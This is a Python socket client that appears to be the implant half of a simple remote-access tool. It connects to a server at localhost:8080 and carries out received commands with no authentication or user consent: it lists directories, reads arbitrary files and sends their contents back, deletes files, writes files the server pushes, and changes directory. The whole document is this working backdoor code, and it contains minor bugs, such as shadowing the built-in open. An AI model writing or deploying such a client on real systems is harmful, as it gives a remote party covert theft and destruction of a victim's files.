import os
import socket

s = socket.socket()

port = 8080

host = "localhost"

s.connect((host,port))
print("")
print("Connected to the server successfully")
print("")

while 1:
  command = s.recv(1024)
  command = command.decode()
  if command == "file":
    files = os.getcwd()
    files = str(files)
    s.send(files.encode())
  elif command == "dir":
    user_input = s.recv(1024)
    user_input = user_input.decode()
    files = os.listdir(user_input)
    files = str(files)
    s.send(files.encode())
  elif command == "move":
    file_path = s.recv(5000)
    file_path = file_path.decode()
    file = open(file_path, "rb")
    date = file.read()
    s.send(date)
  elif command == "remove":
    fileanddir = s.recv(60000)
    fileanddir = fileanddir.decode()
    os.remove(fileanddir)
  elif command == "send":
    filename = s.recv(6000)
    new_file = open(filename, "wb")
    date = s.recv(6000)
    new_file.write(date)
    new_file.close()
  elif command == "open":
    open = s.recv(1024)
    open = open.decode()
    os.chdir(open)
